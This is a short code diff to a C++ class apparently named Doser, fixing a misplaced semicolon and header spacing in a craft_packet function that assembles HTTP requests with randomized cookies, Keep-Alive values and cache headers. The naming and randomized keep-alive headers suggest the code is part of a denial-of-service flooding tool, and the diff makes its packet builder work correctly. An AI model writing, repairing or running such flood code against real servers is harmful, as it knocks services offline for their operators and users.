@@ -284,10 +284,10 @@ std::string Doser::craft_packet(bool keep_alive){
             }
             packet += " \r\nCache-Control: " + caching[0]
                       + " \r\nAccept-Encoding: " + encoding[0]
-                      + " \r\nAccept-Charset: " + charset[0] + "," + charset[1]
+                      + " \r\nAccept-Charset: " + charset[0] + ", " + charset[1]
                       + " \r\nAccept: */*\r\nConnection: Keep-Alive"
                       + " \r\nContent-Type: " + contenttype[0]
-                      + " \r\nCookie: " + createStr() + "=" + createStr();
+                      + " \r\nCookie: " + createStr() + "=" + createStr()
                       + " \r\nKeep-Alive: " + std::to_string(randomInt(1, 5000))
                       + "\r\n\r\n";
             return packet;
@@ -310,7 +310,7 @@ std::string Doser::craft_packet(bool keep_alive){
                 }
                 packet += " \r\nCache-Control: " + caching[0]
                           + " \r\nAccept-Encoding: " + encoding[0]
-                          + " \r\nAccept-Charset: " + charset[0] + "," + charset[1]
+                          + " \r\nAccept-Charset: " + charset[0] + ", " + charset[1]
                           + " \r\nContent-Type: " + contenttype[0]
                           + " \r\nCookie: " + createStr() + "=" + createStr()
                           + " \r\nAccept: */*\r\n"
